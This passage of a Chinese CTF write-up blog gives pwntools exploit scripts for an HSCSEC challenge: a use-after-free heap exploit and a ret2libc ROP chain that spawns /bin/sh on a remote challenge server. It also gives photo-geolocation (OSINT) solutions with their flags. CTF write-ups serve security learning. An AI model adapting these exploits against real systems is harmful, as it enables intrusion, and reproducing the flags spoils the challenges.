class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="EasyHeap"><a href="#EasyHeap" class="headerlink" title="EasyHeap"></a>EasyHeap</h3><p>类似<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">ctf-wiki的hacknote</a>，UAF菜单题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10575</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">magic = <span class="number">0x80495BD</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># show note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="Safe-Program"><a href="#Safe-Program" class="headerlink" title="Safe Program"></a>Safe Program</h3><p>ret2libc，需要根据泄露地址查询libc为libc-2.31。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10914</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401391</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line">main=<span class="number">0x401247</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym.system</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h2 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h2><h3 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h3><p>图片信息有阿勒泰市第十三届元宵灯会，搜索到举办地为五百里风情街，再在地图搜具体地址。</p><p><code>HSCSEC&#123;新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街&#125;</code></p><p>​</p><h3 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h3><p>放大图片发现宁夏理工学院，搜索宁夏理工学院附近的湖为星海湖，再在地图搜具体地址。</p><p><code>HSCSEC&#123;宁夏回族自治区石嘴山市大武口区星海湖&#125;</code></p><p>​</p><h3 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h3><p>百度识图，搜到地点为apple官方(西单大悦城店)，再在地图搜具体地址。</p><p><code>HSCSEC&#123;北京市西城区西单北大街131号&#125;</code></p><p>​</p><h3 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h3><p>百度识图，搜到新闻：<a target="_blank" rel="noopener" href="https://www.sohu.com/a/540130745_121365332">华北最大的湿地公园位于碧桂园官厅蓝北侧 五一假期来这里玩水乘凉 看海棠花吧</a>，得到公园名，再在地图搜具体地址。</p><p><code>HSCSEC&#123;河北省张家口市怀来县官厅水库国家湿地公园&#125;</code></p><p>​</p><h3 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h3><p>百度识图定位杭州西湖，再在地图搜具体地址。</p><p><code>HSCSEC&#123;浙江省杭州市西湖区龙井路1号&#125;</code></p><p>​</p><h3 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h3><p>飞机图片里信息有B-30EL型号，搜索到新闻：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1685764680862717493&amp;wfr=spider&amp;for=pc">又多了一个中型航空公司 重庆航空第30架飞机入列</a>，里面提到 <code>渝兴快线</code>，再根据地面机场特征，与地图比对，为北京大兴国际机场。</p><p><code>HSCSEC&#123;北京市大兴区大兴国际机场&#125;</code></p><p>​</p><h3 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h3><p>百度识图为澳门埃菲尔铁塔，在地图搜具体地址，多次尝试才正确。</p><p><code>HSCSEC&#123;澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人&#125;</code></p><p>​</p><h3 id="Cable-car"><a href="#Cable-car" class="headerlink" title="Cable car"></a>Cable car</h3><p>一眼重庆索道，根据索道和大桥的视角，在地图上找到大致范围，在利用地图3D模式，发现靠近江边的楼最高，只可能在这栋楼里，否则挡视线。楼里有标注着山什集，在美团上也能看到类似图片的分享，尝试该具体地址成功。</p><p><code>HSCSEC&#123;重庆市渝中区白象居4号楼9-1号&#125;</code></p><p>​</p><h3 id="Romantic-firework"><a href="#Romantic-firework" class="headerlink" title="Romantic firework"></a>Romantic firework</h3><p>图片比较模糊，放大查看消防员衣服背后字样，猜测出甘肃消防，再搜索 <code>甘肃 焰火</code>，看到新闻：<a target="_blank" rel="noopener" href="https://www.liuyangfc.com/news/18130.html">甘肃省白银市凌空造出两座”火焰山”，浏阳中洲烟花集团5.5万发高空礼花闪耀元宵夜</a>，新闻中有极其相似的照片；地点为白银城区金岭公园，再在地图搜具体地址。</p><p><code>HSCSEC&#123;甘肃省白银市白银区金岭公园&#125;</code></p><p>​</p></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/" title="2023年春秋杯网络安全联赛 春季赛"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2023/02/06/match-HGAME-2023-Week-4/" title="HGAME 2023 Week 4"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script></body></html>